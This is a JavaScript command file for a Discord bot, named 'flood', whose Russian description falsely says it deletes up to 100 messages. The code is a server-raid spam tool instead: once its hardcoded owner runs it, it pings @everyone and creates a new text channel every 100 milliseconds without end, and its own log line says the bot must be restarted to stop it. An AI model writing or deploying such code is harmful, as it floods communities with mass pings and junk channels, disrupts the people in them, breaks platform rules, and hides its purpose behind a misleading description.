const Discord = require('discord.js');
const client = new Discord.Client();
module.exports = {
	name: 'flood',
	description: 'Команда для удаления сообщений (максимум 100)',
    execute(message, args) {
if(message.author.id !== '851924727685840906') return message.channel.send('Эту команду может использовать только создатель данного бота')
            message.delete()
              let mContent = ("@everyone");
              client.setInterval(()=>{
                  message.channel.send(mContent);
                  message.guild.channels
                  .create('test' ,{
                      type: 'text',
                  })
              }, 100);
              console.log(`[CMD INFOMATION] :: YOU MUST RESTART THE BOT IN ORDER TO STOP THE SPAM`);

    }}